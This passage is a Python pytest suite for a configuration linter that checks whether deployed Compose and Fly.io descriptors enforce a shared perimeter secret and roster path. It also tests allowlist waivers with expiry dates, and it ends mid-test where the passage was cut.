"""Tests for tools/topology_lint.py: fixtures plus the real shipped descriptors."""

from __future__ import annotations

import datetime
import importlib.util
import re
import sys
import textwrap
from pathlib import Path

import pytest

TOOLS = Path(__file__).resolve().parent.parent
REPO = TOOLS.parent
_spec = importlib.util.spec_from_file_location("topology_lint", TOOLS / "topology_lint.py")
lint = importlib.util.module_from_spec(_spec)
sys.modules["topology_lint"] = lint  # dataclasses resolves cls.__module__ here
_spec.loader.exec_module(lint)  # type: ignore[union-attr]

BASE_OPEN = """
x-service: &svc
  environment: &env
    FIELD_DOA_ROSTER: ${FIELD_DOA_ROSTER:-}
    FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:-}
services:
  delegation:
    <<: *svc
    command: delegation serve --host 0.0.0.0 --port 8003
    environment: *env
"""

GB10_OPEN = """
services:
  witness:
    environment:
      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:-}
"""

GB10_ARMED = """
services:
  witness:
    environment:
      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:?set the perimeter secret}
      FIELD_DOA_ROSTER: /data/doa-roster.yaml
  delegation:
    environment:
      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:?set the perimeter secret}
      FIELD_DOA_ROSTER: /data/doa-roster.yaml
"""

ENTRY_OPEN = (
    'export FIELD_DOA_ROSTER="${FIELD_DOA_ROSTER:-}"\n'
    'export FIELD_SHARED_SECRET="${FIELD_SHARED_SECRET:-}"\n'
)
ENTRY_ARMED = (
    'export FIELD_DOA_ROSTER="${FIELD_DOA_ROSTER:-/data/doa-roster.yaml}"\n'
    ': "${FIELD_SHARED_SECRET:?FIELD_SHARED_SECRET must be set}"\n'
)


DOCKERFILE_OK = """
FROM python:3.12-slim
COPY integration/fly/entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENV FIELD_DATA_DIR=/data
ENTRYPOINT ["/entrypoint.sh"]
"""


def make_tree(tmp: Path, *, base=BASE_OPEN, gb10=GB10_OPEN, entry=ENTRY_OPEN, toml="[env]\n",
              dockerfile=DOCKERFILE_OK, extra=None) -> Path:
    files = {
        "integration/demo/docker-compose.yml": base,
        "integration/demo/docker-compose.gb10.yml": gb10,
        "integration/fly/entrypoint.sh": entry,
        "integration/fly/fly.toml": toml,
        "integration/fly/Dockerfile": dockerfile,
    }
    files.update(extra or {})
    for rel, body in files.items():
        p = tmp / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(textwrap.dedent(body), encoding="utf-8")
    _LAST_ROOT[0] = tmp
    return tmp


_LAST_ROOT: list = [None]  # lets _allow() derive a matching waiver key from the tree just built


def run(root: Path, allow=None, today=None):
    reports = lint.analyse(root)
    allowlist = lint.load_allowlist(allow) if allow else []
    errors, notes = lint.evaluate(reports, allowlist, lint.unclassified_descriptors(root), today)
    return reports, errors, notes


def status(reports, topo, var):
    return next(r for r in reports if r.topology.id == topo).vars[var].status


# --- classify_value --------------------------------------------------------

@pytest.mark.parametrize(
    "raw,expected",
    [
        ("${FIELD_SHARED_SECRET:-}", lint.EMPTY),
        ('"${FIELD_SHARED_SECRET:-}"', lint.EMPTY),
        ("", lint.EMPTY),
        (None, lint.EMPTY),
        ("${FIELD_SHARED_SECRET:?set it}", lint.ARMED),
        ("${FIELD_SHARED_SECRET:-fallback}", lint.ARMED),
        ("/data/doa-roster.yaml", lint.ARMED),
        ("${FIELD_SHARED_SECRET}", lint.OPERATOR),
        ("$(cat /run/secret)", lint.OPERATOR),
    ],
)
def test_classify_value(raw, expected):
    assert lint.classify_value(raw, "FIELD_SHARED_SECRET") == expected


# --- fixtures --------------------------------------------------------------

def test_passing_fixture(tmp_path):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED)
    reports, errors, notes = run(root)
    assert errors == [] and notes == []
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.ARMED
    assert status(reports, "fly", "FIELD_DOA_ROSTER") == lint.ARMED
    # The demo topology stays open and that is not a finding.
    assert status(reports, "demo-compose", "FIELD_SHARED_SECRET") == lint.EMPTY


def test_failing_fixture_names_each_deployed_pair_and_never_the_demo(tmp_path):
    root = make_tree(tmp_path)
    _, errors, _ = run(root)
    failed = {e.split()[1] + " " + e.split()[3] for e in errors}
    assert failed == {
        "gb10 FIELD_SHARED_SECRET", "gb10 FIELD_DOA_ROSTER",
        "fly FIELD_SHARED_SECRET", "fly FIELD_DOA_ROSTER",
    }
    assert not any("demo-compose" in e for e in errors)


def test_fly_toml_env_arms_a_roster_and_one_unarmed_var_still_fails(tmp_path):
    root = make_tree(tmp_path, gb10=GB10_ARMED, toml='[env]\nFIELD_DOA_ROSTER = "/data/r.yaml"\n')
    reports, errors, _ = run(root)
    assert status(reports, "fly", "FIELD_DOA_ROSTER") == lint.ARMED
    assert errors == ["FAIL fly (deployed) FIELD_SHARED_SECRET is empty-default, not armed"]


def test_one_weak_service_weakens_the_topology(tmp_path):
    weak = GB10_ARMED + "  canary:\n    environment:\n      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:-}\n"
    root = make_tree(tmp_path, gb10=weak, entry=ENTRY_ARMED)
    reports, errors, _ = run(root)
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.EMPTY
    assert len(errors) == 1


def test_compose_only_tags_are_accepted(tmp_path):
    tagged = GB10_ARMED + '  proxy:\n    image: caddy:2-alpine\n    ports: !override ["18080:8080"]\n'
    root = make_tree(tmp_path, gb10=tagged, entry=ENTRY_ARMED)
    _, errors, _ = run(root)
    assert errors == []


def test_unclassified_descriptor_fails(tmp_path):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED,
                     extra={"integration/new/docker-compose.prod.yml": "services: {}\n"})
    _, errors, _ = run(root)
    assert errors == [
        "unclassified descriptor integration/new/docker-compose.prod.yml: "
        "add it to a Topology (demo or deployed) in tools/topology_lint.py"
    ]


def test_missing_declared_descriptor_is_an_error(tmp_path):
    root = make_tree(tmp_path)
    (root / "integration/fly/fly.toml").unlink()
    with pytest.raises(SystemExit):
        lint.analyse(root)


# --- allowlist -------------------------------------------------------------

TODAY = datetime.date(2026, 10, 23)


def _current(topo, var):
    """(status, services) the lint sees now for the most recently built tree."""
    for r in lint.analyse(_LAST_ROOT[0]):
        if r.topology.id == topo:
            res = r.vars[var]
            return res.status, list(res.services)
    return lint.EMPTY, ["x"]  # unknown topology: the entry is stale anyway


def _allow(tmp_path, entries, verified_on="2026-10-23", verified_by="tester", expected_status=None, services=None):
    """Write an allowlist whose waiver key matches what the lint sees now, unless overridden."""
    p = tmp_path / "allow.yaml"
    lines = ["exceptions:"]
    for t, v, reason in entries:
        st, svcs = _current(t, v)
        lines += [f"  - topology: {t}", f"    var: {v}", f"    reason: {reason}"]
        if expected_status != "":
            lines.append(f"    expected_status: {expected_status or st}")
        if services != "":
            lines.append("    services:")
            lines += [f"      - {x}" for x in (services if services is not None else svcs)]
        if verified_on is not None:
            lines.append(f"    verified_on: {verified_on}")
        if verified_by is not None:
            lines.append(f"    verified_by: {verified_by}")
    p.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return p


def test_allowlist_waives_exactly_the_listed_pairs(tmp_path):
    root = make_tree(tmp_path)
    allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "presence checked")])
    _, errors, notes = run(root, allow, today=TODAY)
    assert len(errors) == 3 and not any("gb10 (deployed) FIELD_SHARED" in e for e in errors)
    assert notes == ["ALLOWED gb10 FIELD_SHARED_SECRET is empty-default: presence checked"]


# --- allowlist expiry (verified_on) -----------------------------------------

def _only_gb10_secret_failing(tmp_path):
    """Tree where exactly gb10/FIELD_SHARED_SECRET fails, so one entry is the whole allowlist."""
    gb10 = (GB10_OPEN + "      FIELD_DOA_ROSTER: /data/doa-roster.yaml\n"
            "  delegation:\n    environment:\n      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:-}\n"
            "      FIELD_DOA_ROSTER: /data/doa-roster.yaml\n")
    return make_tree(tmp_path, gb10=gb10, entry=ENTRY_ARMED)


def test_fresh_allowlist_entry_passes(tmp_path):
    root = _only_gb10_secret_failing(tmp_path)
    allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "r")], verified_on="2026-10-23")
    _, errors, notes = run(root, allow, today=TODAY)
    assert errors == [] and len(notes) == 1


def test_entry_exactly_at_the_limit_still_passes(tmp_path):
    root = _only_gb10_secret_failing(tmp_path)
    on = TODAY - datetime.timedelta(days=lint.ALLOWLIST_MAX_AGE_DAYS)
    allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "r")], verified_on=on.isoformat())
    _, errors, _ = run(root, allow, today=TODAY)
    assert errors == []


def test_entry_31_days_old_fails(tmp_path):
    root = _only_gb10_secret_failing(tmp_path)
    on = TODAY - datetime.timedelta(days=31)
    allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "r")], verified_on=on.isoformat())
    _, errors, _ = run(root, allow, today=TODAY)
    assert len(errors) == 1
    assert "expired" in errors[0] and "31 days old" in errors[0] and "gb10 FIELD_SHARED_SECRET" in errors[0]


def test_entry_missing_verified_on_fails(tmp_path):
    root = _only_gb10_secret_failing(tmp_path)
    allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "r")], verified_on=None)
    _, errors, _ = run(root, allow, today=TODAY)
    assert len(errors) == 1 and "has no verified_on" in errors[0]


def test_entry_with_bad_or_future_verified_on_or_no_verified_by_fails(tmp_path):
    root = _only_gb10_secret_failing(tmp_path)
    for kwargs, needle in [
        ({"verified_on": "yesterday"}, "unparseable verified_on"),
        ({"verified_on": "2026-11-01"}, "in the future"),
        ({"verified_by": None}, "no verified_by"),
    ]:
        allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "r")], **kwargs)
        _, errors, _ = run(root, allow, today=TODAY)
        assert len(errors) == 1 and needle in errors[0], (kwargs, errors)


def test_cli_today_flag_makes_a_stale_entry_fail_the_run(tmp_path, capsys):
    root = _only_gb10_secret_failing(tmp_path / "t")
    allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "r")])
    base = ["--root", str(root), "--allowlist", str(allow)]
    assert lint.main(base + ["--today", "2026-10-23"]) == 0
    assert lint.main(base + ["--today", "2026-11-23"]) == 1
    assert "expired" in capsys.readouterr().out


def test_stale_allowlist_entry_fails(tmp_path):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED)
    allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "r"),
                              ("nowhere", "FIELD_DOA_ROSTER", "x")],
                   expected_status="empty-default", services=["witness"])
    _, errors, _ = run(root, allow, today=TODAY)
    assert any("gb10 FIELD_SHARED_SECRET is no longer a failing pair" in e for e in errors)
    assert any("unknown topology 'nowhere'" in e for e in errors)


def test_allowlist_entry_without_reason_is_rejected(tmp_path):
    p = tmp_path / "a.yaml"
    p.write_text("exceptions:\n  - topology: fly\n    var: FIELD_DOA_ROSTER\n", encoding="utf-8")
    with pytest.raises(SystemExit):
        lint.load_allowlist(p)


def test_allowlisting_the_demo_does_not_hide_a_deployed_topology(tmp_path):
    # Classification is code: an allowlist entry for the demo id waives nothing.
    root = make_tree(tmp_path)
    allow = _allow(tmp_path, [("demo-compose", "FIELD_SHARED_SECRET", "x")])
    _, errors, _ = run(root, allow, today=TODAY)
    assert sum(e.startswith("FAIL") for e in errors) == 4
    assert any("stale allowlist entry: demo-compose" in e for e in errors)


# --- CLI -------------------------------------------------------------------

def test_cli_exit_codes(tmp_path, capsys):
    ok = make_tree(tmp_path / "ok", gb10=GB10_ARMED, entry=ENTRY_ARMED)
    assert lint.main(["--root", str(ok)]) == 0
    bad = make_tree(tmp_path / "bad")
    assert lint.main(["--root", str(bad)]) == 1
    assert "RESULT: FAIL" in capsys.readouterr().out
    assert lint.main(["--root", str(tmp_path / "empty")]) == 2


# --- the real shipped files -------------------------------------------------

def test_real_descriptors_status_is_pinned():
    """Pin what the shipped files actually say, so a change shows up as a diff.

    Today both deployed topologies default both variables to empty. When a
    descriptor is made fail-closed this test must be updated together with
    tools/topology_lint_allowlist.yaml.
    """
    reports = lint.analyse(REPO)
    got = {(r.topology.id, v): x.status for r in reports for v, x in r.vars.items()}
    assert got == {
        ("demo-compose", "FIELD_SHARED_SECRET"): lint.EMPTY,
        ("demo-compose", "FIELD_DOA_ROSTER"): lint.EMPTY,
        ("gb10", "FIELD_SHARED_SECRET"): lint.EMPTY,
        ("gb10", "FIELD_DOA_ROSTER"): lint.EMPTY,
        ("fly", "FIELD_SHARED_SECRET"): lint.EMPTY,
        ("fly", "FIELD_DOA_ROSTER"): lint.EMPTY,
    }


def test_real_descriptors_are_all_classified():
    assert lint.unclassified_descriptors(REPO) == []


def test_real_descriptors_pass_only_through_the_allowlist():
    """Clean with the committed allowlist; the four findings fail without it."""
    # Pinned clock: the committed entries are dated 2026-10-23 and expire by
    # design; this test checks the waiver logic, not the wall clock.
    assert lint.main(["--root", str(REPO), "--today", "2026-10-23"]) == 0
    reports = lint.analyse(REPO)
    errors, _ = lint.evaluate(reports, [], [])
    assert len(errors) == 4 and all(e.startswith("FAIL") for e in errors)


def test_committed_allowlist_records_evidence_and_verification():
    entries = lint.load_allowlist(TOOLS / "topology_lint_allowlist.yaml")
    assert len(entries) == 4
    for e in entries:
        assert "known gap, tracked" not in e["reason"]
        assert "values never read" in e["reason"] and "2026-10-23" in e["reason"]
        assert lint._parse_verified_on(e["verified_on"]) == datetime.date(2026, 10, 23)
        assert "presence check" in e["verified_by"] and "operator to re-confirm" in e["verified_by"]
        assert str(e.get("comment", "")).strip()


# --- review findings: compose tag/semantic handling (group A) ----------------

ARMED_BASE = """
services:
  delegation:
    command: delegation serve --host 0.0.0.0 --port 8003
    environment:
      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:?set it}
      FIELD_DOA_ROSTER: /data/doa-roster.yaml
"""


def _not_armed(reports, topo, var):
    return status(reports, topo, var) != lint.ARMED


def test_reset_tag_removes_the_variable_and_is_never_armed(tmp_path):
    # `!reset null` used to be read as the string "null", which classified as armed.
    gb10 = "services:\n  delegation:\n    environment:\n      FIELD_SHARED_SECRET: !reset null\n"
    root = make_tree(tmp_path, base=ARMED_BASE, gb10=gb10, entry=ENTRY_ARMED)
    reports, errors, _ = run(root)
    assert _not_armed(reports, "gb10", "FIELD_SHARED_SECRET")
    assert status(reports, "gb10", "FIELD_DOA_ROSTER") == lint.ARMED
    assert any(e.startswith("FAIL gb10 (deployed) FIELD_SHARED_SECRET") for e in errors)


def test_override_tag_replaces_the_whole_environment_map(tmp_path):
    keep = "services:\n  delegation:\n    environment:\n      OTHER: x\n"
    gone = "services:\n  delegation:\n    environment: !override\n      OTHER: x\n"
    # control: a plain override file merges key by key and the base stays armed
    reports, errors, _ = run(make_tree(tmp_path / "keep", base=ARMED_BASE, gb10=keep, entry=ENTRY_ARMED))
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.ARMED and errors == []
    # !override drops the base map, so both variables are no longer set
    reports, errors, _ = run(make_tree(tmp_path / "gone", base=ARMED_BASE, gb10=gone, entry=ENTRY_ARMED))
    assert _not_armed(reports, "gb10", "FIELD_SHARED_SECRET") and _not_armed(reports, "gb10", "FIELD_DOA_ROSTER")
    assert sum(e.startswith("FAIL gb10") for e in errors) == 2


def test_bare_list_entry_is_a_host_passthrough_not_empty(tmp_path):
    base = "services:\n  delegation:\n    command: delegation serve --port 1\n    environment:\n      - FIELD_SHARED_SECRET\n      - FIELD_DOA_ROSTER=\n"
    root = make_tree(tmp_path, base=base, gb10="services: {}\n", entry=ENTRY_ARMED)
    reports, _, _ = run(root)
    assert status(reports, "demo-compose", "FIELD_SHARED_SECRET") == lint.OPERATOR
    assert status(reports, "demo-compose", "FIELD_DOA_ROSTER") == lint.EMPTY  # `VAR=` is an explicit empty


@pytest.mark.parametrize("bad", ['"just a string"', "42", "true"])
def test_environment_of_the_wrong_type_is_a_descriptor_error(tmp_path, bad):
    base = f"services:\n  delegation:\n    environment: {bad}\n"
    root = make_tree(tmp_path, base=base)
    with pytest.raises(SystemExit):
        lint.analyse(root)
    assert lint.main(["--root", str(root)]) == 2


@pytest.mark.parametrize(
    "extra,needle",
    [
        ("    env_file: .env\n", "env_file"),
        ("    extends:\n      file: other.yml\n      service: a\n", "extends"),
    ],
)
def test_env_file_and_extends_fail_in_a_deployed_topology(tmp_path, extra, needle):
    gb10 = GB10_ARMED + "  extra:\n    image: x\n    network_mode: none\n" + extra
    root = make_tree(tmp_path, gb10=gb10, entry=ENTRY_ARMED)
    _, errors, _ = run(root)
    assert len(errors) == 1 and errors[0].startswith("FAIL gb10 (deployed)") and needle in errors[0]


def test_top_level_include_fails_in_a_deployed_topology(tmp_path):
    root = make_tree(tmp_path, gb10="include:\n  - other.yml\n" + GB10_ARMED, entry=ENTRY_ARMED)
    _, errors, _ = run(root)
    assert len(errors) == 1 and "include" in errors[0]


def test_env_file_in_the_demo_topology_is_not_a_finding(tmp_path):
    base = BASE_OPEN + "  extra:\n    image: x\n    env_file: .env\n"
    root = make_tree(tmp_path, base=base, gb10=GB10_ARMED, entry=ENTRY_ARMED)
    _, errors, _ = run(root)
    # the base file is also part of gb10, so that is where it is reported
    assert errors and all("(deployed)" in e and "gb10" in e for e in errors)
    reports = lint.analyse(root)
    demo = next(r for r in reports if r.topology.id == "demo-compose")
    assert any("env_file" in f for f in demo.findings)


def test_profiles_are_noted_in_the_report(tmp_path):
    gb10 = GB10_ARMED + "  witness2:\n    profiles: [witness]\n    environment:\n      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:?x}\n"
    root = make_tree(tmp_path, gb10=gb10, entry=ENTRY_ARMED)
    reports = lint.analyse(root)
    gb = next(r for r in reports if r.topology.id == "gb10")
    assert any("witness2" in n and "witness" in n for n in gb.notes)


# --- review findings: classify_value and fly.toml (group B) -------------------

@pytest.mark.parametrize(
    "raw,expected",
    [
        ("${FIELD_SHARED_SECRET:-${OTHER:-}}", lint.EMPTY),      # default is itself empty
        ("${FIELD_SHARED_SECRET:-${OTHER:?need it}}", lint.ARMED),
        ("${FIELD_SHARED_SECRET:-${OTHER}}", lint.OPERATOR),
        ('${FIELD_SHARED_SECRET:-""}', lint.EMPTY),              # quotes stripped before the empty test
        ("${FIELD_SHARED_SECRET:-''}", lint.EMPTY),
        ("${FIELD_SHARED_SECRET?need it}", lint.EMPTY),          # bare ? passes an empty value
        ("${FIELD_SHARED_SECRET:?need it}", lint.ARMED),         # only :? is required-non-empty
        ("${FIELD_SHARED_SECRET-fallback}", lint.OPERATOR),      # set-but-empty host value stays empty
        ("${FIELD_SHARED_SECRET-}", lint.EMPTY),
        ("changeme", lint.PLACEHOLDER),
        ("Password", lint.PLACEHOLDER),
        ("secret", lint.PLACEHOLDER),
        ("test", lint.PLACEHOLDER),
        ("demo", lint.PLACEHOLDER),
        ("${FIELD_SHARED_SECRET:-changeme}", lint.PLACEHOLDER),
        ("${FIELD_SHARED_SECRET:-a-long-random-looking-value}", lint.ARMED),
    ],
)
def test_classify_value_review_cases(raw, expected):
    assert lint.classify_value(raw, "FIELD_SHARED_SECRET") == expected


def test_placeholder_words_only_matter_for_the_secret_not_a_roster_path():
    assert lint.classify_value("test", "FIELD_DOA_ROSTER") == lint.ARMED


def test_placeholder_secret_fails_a_deployed_topology(tmp_path):
    gb10 = GB10_ARMED.replace("${FIELD_SHARED_SECRET:?set the perimeter secret}", "changeme")
    root = make_tree(tmp_path, gb10=gb10, entry=ENTRY_ARMED)
    _, errors, _ = run(root)
    assert any("is placeholder, not armed" in e for e in errors)


def test_fly_toml_literal_secret_is_its_own_finding(tmp_path):
    toml = '[env]\nFIELD_SHARED_SECRET = "a-committed-real-looking-value"\n'
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_OPEN.replace("FIELD_SHARED_SECRET:-", "FIELD_SHARED_SECRET:-"), toml=toml)
    reports, errors, _ = run(root)
    assert status(reports, "fly", "FIELD_SHARED_SECRET") == lint.ARMED
    lit = [e for e in errors if "literal" in e]
    assert len(lit) == 1 and "fly.toml" in lit[0] and "fly secrets" in lit[0]
    assert "a-committed-real-looking-value" not in " ".join(errors)  # never echo the value


def test_compose_literal_secret_is_a_finding_too(tmp_path):
    gb10 = GB10_ARMED.replace("${FIELD_SHARED_SECRET:?set the perimeter secret}", "a-committed-real-looking-value", 1)
    root = make_tree(tmp_path, gb10=gb10, entry=ENTRY_ARMED)
    _, errors, _ = run(root)
    assert any("literal" in e and "a-committed-real-looking-value" not in e for e in errors)


def test_missing_tomllib_is_a_hard_failure_not_a_silent_skip(tmp_path, monkeypatch):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED)
    monkeypatch.setitem(sys.modules, "tomllib", None)
    with pytest.raises(SystemExit):
        lint.analyse(root)


# --- review findings: services with no entry, roster consumer scope (group C) --

C_BASE = """
services:
  proxy:
    image: caddy:2-alpine
    ports: ["8080:8080"]
  delegation:
    command: delegation serve --host 0.0.0.0 --port 8003
    environment:
      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:?set it}
      FIELD_DOA_ROSTER: /data/doa-roster.yaml
"""


def _c_tree(tmp_path, extra_gb10="", base=C_BASE):
    return make_tree(tmp_path, base=base, gb10="services: {}\n" + extra_gb10 if not extra_gb10 else extra_gb10, entry=ENTRY_ARMED)


def test_http_service_with_no_secret_entry_makes_the_topology_weak(tmp_path):
    extra = "services:\n  newgw:\n    command: newgw serve --port 9\n"
    reports, errors, _ = run(_c_tree(tmp_path, extra))
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.EMPTY
    assert any(e.startswith("FAIL gb10 (deployed) FIELD_SHARED_SECRET") for e in errors)


def test_service_with_published_ports_counts_as_http(tmp_path):
    extra = "services:\n  newgw:\n    image: x\n    ports: ['9:9']\n"
    reports, _, _ = run(_c_tree(tmp_path, extra))
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.EMPTY


def test_one_shot_admin_tool_with_no_entry_is_not_a_finding(tmp_path):
    extra = ("services:\n  keys-admin:\n    profiles: [admin]\n    network_mode: none\n"
             "    entrypoint: ['python', 'volume_admin.py', 'keys']\n")
    reports, errors, _ = run(_c_tree(tmp_path, extra))
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.ARMED and errors == []


def test_the_proxy_is_exempt_by_name_with_a_reason_and_nothing_else_is(tmp_path):
    # C_BASE already has a `proxy` with ports and no secret entry
    reports, errors, _ = run(_c_tree(tmp_path))
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.ARMED and errors == []
    ev = " ".join(next(r for r in reports if r.topology.id == "gb10").vars["FIELD_SHARED_SECRET"].evidence)
    assert "exempt" in ev and "proxy" in ev
    assert ("gb10", "FIELD_SHARED_SECRET", "proxy") in lint.SERVICE_EXEMPTIONS
    assert all(reason.strip() and req for reason, req in lint.SERVICE_EXEMPTIONS.values())
    other = "services:\n  proxy2:\n    image: caddy:2-alpine\n    ports: ['1:1']\n"
    reports, _, _ = run(_c_tree(tmp_path / "o", other))
    assert status(reports, "gb10", "FIELD_SHARED_SECRET") == lint.EMPTY


def test_roster_status_is_decided_by_its_consumer_only(tmp_path):
    # an unrelated service with an empty roster default must not decide the status
    extra = ("services:\n  unrelated:\n    command: x serve --port 7\n    environment:\n"
             "      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:?set it}\n      FIELD_DOA_ROSTER: ${FIELD_DOA_ROSTER:-}\n")
    reports, errors, _ = run(_c_tree(tmp_path, extra))
    assert status(reports, "gb10", "FIELD_DOA_ROSTER") == lint.ARMED and errors == []


def test_roster_consumer_with_no_entry_is_empty(tmp_path):
    extra = "services:\n  delegation:\n    environment: !override\n      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:?set it}\n"
    reports, errors, _ = run(_c_tree(tmp_path, extra))
    assert status(reports, "gb10", "FIELD_DOA_ROSTER") == lint.EMPTY
    assert any("FIELD_DOA_ROSTER" in e for e in errors)


def test_roster_consumer_missing_from_the_topology_is_not_armed(tmp_path):
    base = C_BASE.replace("delegation:", "renamed:").replace("delegation serve", "other-thing serve")
    reports, errors, _ = run(_c_tree(tmp_path, base=base))
    assert status(reports, "gb10", "FIELD_DOA_ROSTER") != lint.ARMED
    assert any("FIELD_DOA_ROSTER" in e for e in errors)


# --- review findings: entrypoint.sh and the Fly Dockerfile (group D) -----------

def _fly_findings(tmp_path, entry=ENTRY_ARMED, dockerfile=DOCKERFILE_OK):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=entry, dockerfile=dockerfile)
    reports, errors, _ = run(root)
    return reports, [e for e in errors if e.startswith("FAIL fly")]


def test_clean_entrypoint_and_dockerfile_have_no_findings(tmp_path):
    _, fly = _fly_findings(tmp_path)
    assert fly == []






def test_trailing_comment_is_not_part_of_the_value(tmp_path):
    entry = ('export FIELD_DOA_ROSTER="${FIELD_DOA_ROSTER:-/data/doa-roster.yaml}"  # default path\n'
             'export FIELD_SHARED_SECRET="${FIELD_SHARED_SECRET:?must be set}"  # required\n')
    reports, fly = _fly_findings(tmp_path, entry=entry)
    assert status(reports, "fly", "FIELD_SHARED_SECRET") == lint.ARMED
    assert status(reports, "fly", "FIELD_DOA_ROSTER") == lint.ARMED
    assert fly == []


def test_a_hash_inside_quotes_is_not_a_comment():
    assert lint.strip_trailing_comment('export A="x # y"  # real') == 'export A="x # y"'
    assert lint.strip_trailing_comment("export A=b#c") == "export A=b#c"


@pytest.mark.parametrize(
    "dockerfile,needle",
    [
        (DOCKERFILE_OK.replace('ENTRYPOINT ["/entrypoint.sh"]', 'ENTRYPOINT ["/bin/sh", "-c", "exec /entrypoint.sh"]'), "ENTRYPOINT"),
        (DOCKERFILE_OK.replace('ENTRYPOINT ["/entrypoint.sh"]', "ENTRYPOINT /entrypoint.sh"), "ENTRYPOINT"),
        (DOCKERFILE_OK.replace('ENTRYPOINT ["/entrypoint.sh"]', 'CMD ["/entrypoint.sh"]'), "ENTRYPOINT"),
        (DOCKERFILE_OK + 'CMD ["sh", "-c", "FIELD_SHARED_SECRET= run"]\n', "CMD"),
        (DOCKERFILE_OK + "ENV FIELD_SHARED_SECRET=baked-in-value\n", "ENV"),
        (DOCKERFILE_OK + "ARG FIELD_SHARED_SECRET\n", "ARG"),
        (DOCKERFILE_OK + "RUN sed -i s/x/y/ /entrypoint.sh\n", "entrypoint.sh"),
        (DOCKERFILE_OK.replace("COPY integration/fly/entrypoint.sh /entrypoint.sh", "COPY other.sh /entrypoint.sh"), "COPY"),
    ],
)
def test_fly_dockerfile_findings(tmp_path, dockerfile, needle):
    _, fly = _fly_findings(tmp_path, dockerfile=dockerfile)
    assert fly and any("Dockerfile" in e and needle in e for e in fly), fly
    assert "baked-in-value" not in " ".join(fly)


def test_dockerfile_env_for_another_variable_is_fine(tmp_path):
    _, fly = _fly_findings(tmp_path, dockerfile=DOCKERFILE_OK + "ENV FIELD_BUILD_SHA=abc\n")
    assert fly == []


def test_dockerfile_continuation_lines_are_joined(tmp_path):
    df = DOCKERFILE_OK + "ENV FOO=1 \\\n    FIELD_SHARED_SECRET=hunter2\n"
    _, fly = _fly_findings(tmp_path, dockerfile=df)
    assert any("ENV" in e for e in fly)


def test_missing_fly_dockerfile_is_a_descriptor_error(tmp_path):
    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED)
    (root / "integration/fly/Dockerfile").unlink()
    with pytest.raises(SystemExit):
        lint.analyse(root)


def test_one_guard_plus_one_export_is_allowed_and_armed(tmp_path):
    entry = ENTRY_ARMED + 'export FIELD_SHARED_SECRET="${FIELD_SHARED_SECRET:-}"\n'
    reports, fly = _fly_findings(tmp_path, entry=entry)
    assert fly == [] and status(reports, "fly", "FIELD_SHARED_SECRET") == lint.ARMED


# --- review findings: the waiver key (group E) --------------------------------

def _rewrite_gb10(root, body):
    (root / "integration/demo/docker-compose.gb10.yml").write_text(textwrap.dedent(body), encoding="utf-8")


def test_waiver_matches_only_the_status_and_service_set_it_was_written_for(tmp_path):
    root = _only_gb10_secret_failing(tmp_path)
    allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "r")])
    _, errors, notes = run(root, allow, today=TODAY)
    assert errors == [] and len(notes) == 1


def test_a_new_weak_service_breaks_the_waiver(tmp_path):
    root = _only_gb10_secret_failing(tmp_path)
    allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "r")])
    _rewrite_gb10(root, GB10_OPEN + "      FIELD_DOA_ROSTER: /data/doa-roster.yaml\n"
                  "  delegation:\n    environment:\n      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:-}\n"
                  "      FIELD_DOA_ROSTER: /data/doa-roster.yaml\n"
                  "  newcomer:\n    environment:\n      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET:-}\n")
    _, errors, _ = run(root, allow, today=TODAY)
    assert len(errors) == 1 and "newcomer" in errors[0] and "allowlist entry" in errors[0]


def test_a_weak_service_dropping_out_also_breaks_the_waiver(tmp_path):
    root = _only_gb10_secret_failing(tmp_path)
    allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "r")], services=["delegation", "witness", "gone"])
    _, errors, _ = run(root, allow, today=TODAY)
    assert len(errors) == 1 and "gone" in errors[0]


def test_empty_default_turning_into_operator_passthrough_breaks_the_waiver(tmp_path):
    root = _only_gb10_secret_failing(tmp_path)
    allow = _allow(tmp_path, [("gb10", "FIELD_SHARED_SECRET", "r")])
    _rewrite_gb10(root, "services:\n  witness:\n    environment:\n      FIELD_SHARED_SECRET: ${FIELD_SHARED_SECRET}\n"
